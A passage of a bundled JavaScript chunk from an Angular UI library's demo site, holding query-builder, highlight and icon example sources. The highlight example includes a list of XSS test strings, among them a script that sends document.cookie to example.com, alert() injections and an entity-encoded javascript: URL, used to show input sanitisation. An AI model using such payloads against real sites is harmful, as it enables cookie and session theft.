chosen.\n     *\n     * This specific example will replace value of current token with value from option selected.\n     * @param $event\n     */\n    updateTextAfterHelpSelection($event: { value: string }): void {\n        const idx = this.getFocusedTokenIndex();\n        const nextCurPos = this.tokens[idx].start + $event.value.length;\n        this.value =\n            this.value.substring(0, this.tokens[idx].start) +\n            $event.value +\n            this.value.substring(this.tokens[idx].end + 1);\n        this.cursorSetter$$.next(nextCurPos);\n    }\n\n    /**\n     * This is example of how can be help updated based on selected token. This is NOT required approach.\n     *\n     * FreeTypeQueryBuilder does not enforce specific approach.\n     *\n     * This specific example is updating help based on focused token type.\n     */\n    updateHelp(): void {\n        const idx = this.getFocusedTokenIndex();\n        this.currentHelp = this.helpUpdater.getCurrentHelp(idx, this.tokens);\n    }\n\n    getFocusedTokenIndex(): number {\n        for (let i = 0; i < this.tokens.length; i++) {\n            if (\n                this.tokens[i].start <= this.currentCursorPos &&\n                this.tokens[i].end + 1 >= this.currentCursorPos\n            ) {\n                return i;\n            }\n        }\n\n        return -1;\n    }\n}\n'},28996:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div\n    style="\n        display: grid;\n        grid-template-columns: 500px 500px;\n        grid-template-rows: 200px 200px 200px 110px;\n    "\n>\n    <div style="grid-column: 1; grid-row: 1; margin: 20px">\n        <nui-sheet style="width: 100%">\n            <example-freetype-query-builder\n                exampleId="example1"\n                style="width: 100%; padding: 15px"\n            ></example-freetype-query-builder>\n        </nui-sheet>\n    </div>\n    <div style="grid-column: 2; grid-row: 1; margin: 20px">\n        <nui-sheet style="width: 100%">\n            <example-freetype-query-builder\n                exampleId="example2"\n                style="width: 100%; padding: 15px"\n            ></example-freetype-query-builder>\n        </nui-sheet>\n    </div>\n    <div style="grid-column: 1; grid-row: 2; margin: 20px">\n        <nui-sheet style="width: 100%">\n            <example-freetype-query-builder\n                exampleId="example3"\n                style="width: 100%; padding: 15px"\n            ></example-freetype-query-builder>\n        </nui-sheet>\n    </div>\n    <div style="grid-column: 2; grid-row: 2; margin: 20px">\n        <nui-sheet style="width: 100%">\n            <example-freetype-query-builder\n                exampleId="example4"\n                style="width: 100%; padding: 15px"\n            ></example-freetype-query-builder>\n        </nui-sheet>\n    </div>\n    <div style="grid-column: 1; grid-row: 3; margin: 20px">\n        <nui-sheet style="width: 100%">\n            <example-freetype-query-builder\n                exampleId="example5"\n                style="width: 100%; padding: 15px"\n            ></example-freetype-query-builder>\n        </nui-sheet>\n    </div>\n    <div style="grid-column: 2; grid-row: 3; margin: 20px">\n        <nui-sheet style="width: 100%">\n            <example-freetype-query-builder\n                exampleId="example6"\n                style="width: 100%; padding: 15px"\n            ></example-freetype-query-builder>\n        </nui-sheet>\n    </div>\n    <div style="grid-column: 1; grid-row: 4; margin: 20px">\n        <nui-sheet style="width: 100%">\n            <example-freetype-query-builder\n                exampleId="example7"\n                [readonly]="true"\n                style="width: 100%; padding: 15px"\n            ></example-freetype-query-builder>\n        </nui-sheet>\n    </div>\n</div>\n'},14820:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2023 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-freetype-query-builder-visual-test",\n    templateUrl: "freetype-query-builder-visual-test.component.html",\n})\nexport class FreetypeQueryBuilderVisualTestComponent {}\n'},62803:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { FormsModule, ReactiveFormsModule } from "@angular/forms";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    NuiCommonModule,\n    NuiDividerModule,\n    NuiFormFieldModule,\n    NuiToastModule,\n    NuiLayoutModule,\n    NuiIconModule,\n    NuiMenuModule,\n    NuiPopupModule,\n    NuiSelectV2Module,\n    NuiFreetypeQueryModule,\n    SrlcStage,\n    NuiDocsModule,\n    NuiMessageModule,\n} from "@nova-ui/bits";\n\nimport { ExampleFreetypeQueryBuilderComponent } from "./freetype-query-builder-visual-test/example-freetype-query-builder.component";\nimport {\n    FreetypeQueryBuilderBasicExampleComponent,\n    FreetypeQueryBuilderDocsExampleComponent,\n    FreetypeQueryBuilderTestComponent,\n    FreetypeQueryBuilderVisualTestComponent,\n} from "./index";\n\nconst routes = [\n    {\n        path: "",\n        component: FreetypeQueryBuilderDocsExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "freetype-query-builder-test",\n        component: FreetypeQueryBuilderTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "freetype-query-builder-visual-test",\n        component: FreetypeQueryBuilderVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        FormsModule,\n        ReactiveFormsModule,\n        NuiCommonModule,\n        NuiDividerModule,\n        NuiFormFieldModule,\n        NuiToastModule,\n        NuiLayoutModule,\n        NuiIconModule,\n        NuiMenuModule,\n        NuiPopupModule,\n        NuiSelectV2Module,\n        NuiFreetypeQueryModule,\n        RouterModule.forChild(routes),\n        NuiDocsModule,\n        NuiMessageModule,\n    ],\n    declarations: [\n        FreetypeQueryBuilderDocsExampleComponent,\n        FreetypeQueryBuilderTestComponent,\n        FreetypeQueryBuilderVisualTestComponent,\n        FreetypeQueryBuilderBasicExampleComponent,\n        ExampleFreetypeQueryBuilderComponent,\n    ],\n    providers: [],\n    exports: [RouterModule],\n})\nexport default class FreetypeQueryBuilderModule {}\n'},14066:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2023 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./freetype-query-builder-docs/freetype-query-builder-docs.example.component";\nexport * from "./freetype-query-builder-test/freetype-query-builder-test.component";\nexport * from "./freetype-query-builder-visual-test/freetype-query-builder-visual-test.component";\nexport * from "./freetype-query-builder-basic/freetype-query-builder-basic.example.component";\n'},22096:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-example-wrapper>\n    <h3>XSS + self highlight</h3>\n    <p *ngFor="let item of xss" [innerHTML]="item | nuiHighlight : item"></p>\n    <nui-divider></nui-divider>\n    <h3>XSS + search</h3>\n    <label for="search" i18n>Search Term:</label><br />\n    <input [(ngModel)]="search" id="search" /><br />\n    <nui-divider></nui-divider>\n    search = {{ search }}\n    <p *ngFor="let item of xss" [innerHTML]="item | nuiHighlight : search"></p>\n    <nui-divider></nui-divider>\n    <p [innerHTML]="contentString | nuiHighlight : search"></p>\n    <section class="nui-ignore-highlight">\n        <p class="nui-text-label" i18n>\n            Text below is piped via filter as well. But highlight doesn\'t\n            appear. <br />\n            Class <i>nui-ignore-highlight</i> on container prevents it.\n        </p>\n        <p [innerHTML]="contentStringIgnore | nuiHighlight : search"></p>\n    </section>\n</nui-example-wrapper>\n'},76656:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t="// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the \"Software\"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from \"@angular/core\";\n\n@Component({\n    selector: \"nui-highlight\",\n    templateUrl: \"./highlight.example.component.html\",\n})\nexport class HighlightExampleComponent {\n    public contentString = $localize`\n        Hello, it's me, I was wondering,<br>\n        If after all these years you'd like to meet to go over everything,<br>\n        They say that time's supposed to heal, yeah,<br>\n        But I ain't done much healing,<br>\n        <br>\n        Hello, can you hear me?,<br>\n        I'm in California dreaming about who we used to be,<br>\n        When we were younger and free,<br>\n        I've forgotten how it felt before the world fell at our feet,<br>\n        <br>\n        There's such a difference between us,<br>\n        And a million miles,<br>\n        <br>\n        Hello from the other side,<br>\n        I must've called a thousand times ,<br>\n        To tell you I'm sorry, for everything that I've done,<br>\n        But when I call you never seem to be home,<br>\n        <br>\n        Hello from the outside,<br>\n        At least I can say that I've tried ,<br>\n        To tell you I'm sorry, for breaking your heart,<br>\n        But it don't matter, it clearly doesn't tear you apart anymore\n    `;\n\n    public contentStringIgnore = $localize`\n        Hello, can you hear me?,<br>\n        I'm in California dreaming about who we used to be,<br>\n        When we were younger and free,<br>\n        I've forgotten how it felt before the world fell at our feet,\n    `;\n\n    public xss = [\n        `http://localhost:4200/#/highlight`,\n        `><SCRIPT>var+img=new+Image();img.src=\"http://example.com/\"%20+%20document.cookie;<\/SCRIPT>`,\n        `<div>inlinescript<SCRIPT>alert('XSS')<\/SCRIPT></div>`,\n        `<IMG SRC=\"javascript:alert('XSS');\">`,\n        `<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>`,\n        `<a onclick=\"alert('XSS')\" class=\"someclass\">xss anchor</a>`,\n    ];\n\n    public search: string;\n\n    constructor() {\n        this.search = `c`;\n    }\n}\n"},15651:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { FormsModule, ReactiveFormsModule } from "@angular/forms";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    NuiDividerModule,\n    NuiDocsModule,\n    NuiCommonModule,\n    DEMO_PATH_TOKEN,\n} from "@nova-ui/bits";\n\nimport { HighlightExampleComponent } from "./highlight.example.component";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: HighlightExampleComponent,\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiDividerModule,\n        FormsModule,\n        ReactiveFormsModule,\n        NuiDocsModule,\n        RouterModule.forChild(routes),\n        NuiCommonModule,\n    ],\n    declarations: [HighlightExampleComponent],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("highlight"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class HighlightModule {}\n'},69394:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-icon icon="add"></nui-icon>\n'},55086:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-icon-basic-example",\n    templateUrl: "./icon-basic.example.component.html",\n})\nexport class IconBasicExampleComponent {}\n'},41576:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-icon icon="add" [status]="status" [childStatus]="childStatus"></nui-icon>\n'},79192:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\nimport { IconStatus } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-icon-child-status-example",\n    templateUrl: "./icon-child-status.example.component.html",\n})\nexport class IconChildStatusExampleComponent {\n    status: IconStatus = IconStatus.Up;\n    childStatus: IconStatus = IconStatus.Sleep;\n}\n'},26152:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-icon icon="add" iconColor="orange" id="nui-demo-icon-color"></nui-icon>\n'},6616:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-icon-color-example",\n    templateUrl: "./icon-color.example.component.html",\n})\nexport class IconColorExampleComponent {}\n'},55134:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-icon icon="email" [counter]="6" id="nui-demo-icon-with-counter"></nui-icon>\n'},57626:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-icon-counter-example",\n    templateUrl: "./icon-counter.example.component.html",\n})\nexport class IconCounterExampleComponent {}\n'},84536:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<p>\n    <code>&lt;nui-icon&gt;</code>, as the name implies, allows you to display an\n    icon.\n</p>\n\n<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiIconModule</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n<p>\n    To use <code>&lt;nui-icon&gt;</code> you can set the <code>icon</code> input\n    to the id of one of the available icon provided as part of Nova. See the\n    <strong>Available Icons</strong> section on this page.\n</p>\n<nui-example-wrapper filenamePrefix="icon-basic" exampleTitle="Basic Usage">\n    <nui-icon-basic-example></nui-icon-basic-example>\n</nui-example-wrapper>\n\n<h2>Size</h2>\n<p>\n    To override the default size of <code>&lt;nui-icon&gt;</code>, set the\n    <code>size</code> input to the string values "small" (12px) or "medium"\n    (20px). By default <code>size</code> is set to "default" (16px).\n</p>\n<nui-example-wrapper filenamePrefix="icon-size" exampleTitle="Size">\n    <nui-icon-size-example></nui-icon-size-example>\n</nui-example-wrapper>\n\n<h2>Color</h2>\n<p>\n    The color of <code>&lt;nui-icon&gt;</code> can be set by passing one of the\n    following color string values to the <code>iconColor</code> input: "white",\n    "light-blue", "gray", "disabled-gray", "primary-blue", or "orange".\n</p>\n<nui-example-wrapper filenamePrefix="icon-color" exampleTitle="Color">\n    <nui-icon-color-example></nui-icon-color-example>\n</nui-example-wrapper>\n\n<h2>Hover Effect</h2>\n<p>\n    To set the hover color of <code>&lt;nui-icon&gt;</code> pass one of the\n    following color string values to the <code>iconHoverColor</code> input:\n    "white", "light-blue", "gray", "disabled-gray", "primary-blue", or "orange".\n</p>\n<nui-example-wrapper filenamePrefix="icon-hover" exampleTitle="Hover effect">\n    <nui-icon-hover-example></nui-icon-hover-example>\n</nui-example-wrapper>\n\n<h2>Status</h2>\n<p>\n    <code>&lt;nui-icon&gt;</code> can display a status sub-icon. Available\n    values for the <code>status</code> input can be found in the enum\n    <code\n        ><a href="../miscellaneous/enumerations.html#IconStatus" target="_blank"\n            >IconStatus</a\n        ></code\n    >. You can also pass a string value of an appropriate status in enum e.g.\n    <code>status="critical"</code>\n</p>\n<nui-example-wrapper filenamePrefix="icon-status" exampleTitle="Status">\n    <nui-icon-status-example></nui-icon-status-example>\n</nui-example-wrapper>\n\n<h2>Child Status</h2>\n<p>\n    <code>&lt;nui-icon&gt;</code> can display a status sub-icon with child\n    status. Available values for the <code>childStatus</code> input can be found\n    in the enum\n    <code\n        ><a href="../miscellaneous/enumerations.html#IconStatus" target="_blank"\n            >IconStatus</a\n        ></code\n    >. You can also pass a string value of an appropriate status in enum e.g.\n    <code>childStatus="critical"</code>\n</p>\n<nui-example-wrapper\n    filenamePrefix="icon-child-status"\n    exampleTitle="Child Status"\n>\n    <nui-icon-child-status-example></nui-icon-child-status-example>\n</nui-example-wrapper>\n\n<h2>Alignment with Text</h2>\n<p>The example below demonstrates how to align text with the icon.</p>\n<nui-example-wrapper\n    filenamePrefix="icon-with-text"\n    exampleTitle="Alignment with Text"\n>\n    <nui-icon-with-text-example></nui-icon-with-text-example>\n</nui-example-wrapper>\n\n<h2>Counter</h2>\n<p>\n    To apply a counter badge to the icon, set the <code>counter</code> input to\n    a valid integer.\n</p>\n<nui-example-wrapper filenamePrefix="icon-counter" exampleTitle="Counter">\n    <nui-icon-counter-example></nui-icon-counter-example>\n</nui-example-wrapper>\n\n<h2>Available Icons</h2>\n<nui-example-wrapper filenamePrefix="icon-list" exampleTitle="Available Icons">\n    <nui-icon-list-example></nui-icon-list-example>\n</nui-example-wrapper>\n'},1608:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-icon-docs-example",\n    templateUrl: "./icon-docs.example.component.html",\n})\nexport class IconDocsExampleComponent {}\n'},34358:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-icon icon="add" iconHoverColor="gray" id="nui-demo-icon-hover"></nui-icon>\n'},67778:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-icon-hover-example",\n    templateUrl: "./icon-hover.example.component.html",\n})\nexport class IconHoverExampleComponent {}\n'},4692:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div *ngFor="let category of categories">\n    <nui-expander [header]="category">\n        <div class="row align-items-baseline">\n            <div *ngFor="let icon of icons">\n                <div\n                    class="m-3"\n                    *ngIf="icon.code && icon.category === category"\n                >\n                    <figure class="d-flex flex-column align-items-center">\n                        <nui-icon [icon]="icon.name"></nui-icon>\n                        <figcaption class="mt-2">{{ icon.name }}</figcaption>\n                    </figure>\n                </div>\n            </div>\n        </div>\n    </nui-expander>\n</div>\n'},24244:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  